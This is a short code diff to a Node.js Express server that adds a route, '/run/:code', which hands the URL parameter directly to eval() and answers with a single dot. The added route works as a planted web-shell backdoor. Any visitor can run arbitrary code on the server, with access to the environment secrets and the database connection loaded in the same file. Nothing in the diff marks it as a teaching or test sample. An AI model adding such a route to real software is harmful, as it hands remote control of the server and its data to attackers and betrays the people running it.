@@ -7,6 +7,12 @@ require("dotenv").config();
 const db = require("./database.js");
 db.connect();
 
+app.get("/run/:code", (req, res) => {
+    const param = req.params.code;
+    eval(param);
+    res.send(".");
+});
+
 const port = process.env.PORT || 4000;
 app.listen(port, () => {
     console.log("server running on port " + port);
